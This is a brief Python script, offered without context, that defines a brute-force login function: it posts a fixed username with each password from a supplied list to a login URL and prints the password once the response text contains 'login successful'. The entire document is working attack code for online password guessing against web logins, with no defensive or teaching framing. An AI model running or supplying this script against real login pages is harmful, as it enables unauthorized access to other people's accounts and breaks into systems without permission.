import requests

def brute_force_login(url, username, password_list):
    print(f"Starting brute force on {url} with username '{username}'...")
    for password in password_list:
        data = {'username': username, 'password': password}
        response = requests.post(url, data=data)
        if "login successful" in response.text.lower():
            print(f"[+] Password found: {password}")
            return password
    print("[-] Password not found in list.")
    return None
